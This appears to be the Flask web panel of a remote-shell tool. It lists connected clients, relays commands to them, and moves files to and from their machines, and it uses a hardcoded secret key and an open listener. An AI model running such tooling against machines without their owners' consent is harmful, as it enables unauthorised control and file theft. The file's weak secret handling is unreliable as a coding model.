import io
from threading import Thread

from flask import Flask, session, render_template, redirect, url_for, request, send_file

import models
from Server import server

# configuring the Flask app
app = Flask(__name__)
app.secret_key = "secret"


# default route
# get redirected to the clients route
@app.route('/')
def default():
    return redirect(url_for("clients"))


# clients route
# all connected clients are getting displayed
@app.route("/clients")
def clients():
    return render_template("clients.html", cls=server.clients)


# shell route
# Site to interact with a client
# POST and GET Methods are allowed
# GET request: the template is getting rendered for a specific client
# POST request: a command has been entered and is not being processed
@app.route("/shell/<shell_id>", methods=["POST", "GET"])
def shell(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if not server.is_client_connected(client.socket):
        server.clients.remove(client)
        return redirect(url_for("clients"))
    if request.method == "GET":
        return render_template("shell.html", client=client)
    else:
        user_in = request.form["cmd"]
        if user_in == "":
            return render_template("shell.html", client=client)
        cmd = user_in.split(" ")[0]
        if cmd == "clear":
            client.output = []
        elif cmd == "download":
            result = server.handle_command(user_in, client)
            # catch the result for when a file to download has been returned
            if not type(result) == str:
                file_name = result[0]
                file = result[1]
                # sending file to user to download (in Browser)
                return send_file(file,
                                 as_attachment=True,
                                 download_name=file_name)
            else:
                client.append_output(out=result, cmd=user_in)
        elif cmd == "help":
            output = """
            pwd - View current directory
            cd [destination] - Move to different directory (e.g. cd ..)
            ls [args] - List content of directory (-a to include hidden files)
            clear - Clear the console
            download [file] - Download file from client (e.g. download test.txt | /home/test.txt)
            send [file] - Send file from uploaded files to client (e.g. send test.txt) 
            """
            client.append_output(out=output, cmd=cmd)

        else:
            # handle default commands where there is just a regular output that is getting displayed in the "console"
            output = server.handle_command(user_in, client)
            # output is added to the client instance
            client.append_output(out=output, cmd=user_in)
            # shell.html retrieves client instance to display all the needed data
        return render_template("shell.html", client=client)


# upload file route
# POST request: uploaded files are being processed (added to the specific Client instance)
@app.route("/shell/<shell_id>/upload_file", methods=["POST"])
def upload_file(shell_id):
    shell_id = int(shell_id)
    client = server.clients[shell_id]
    if request.files:
        if "file" in request.files:
            # Creating MemFile instance with file name and data
            # And adding the instance to the file list in the client
            file = request.files["file"]
            in_mem_file = io.BytesIO()
            file.save(in_mem_file)
            print(in_mem_file.getbuffer().nbytes)
            mem_file = models.MemFile(file.filename, in_mem_file)
            client.add_file(mem_file)
    return redirect(url_for("shell", shell_id=shell_id))


# get executed when this python file runs
if __name__ == '__main__':
    # Thread started where listen_for_clients method from server.py is running
    # necessary to constantly accept connecting clients in the background
    thread = Thread(target=server.listen_for_clients)
    thread.start()
    app.run(host="0.0.0.0", port=5002)
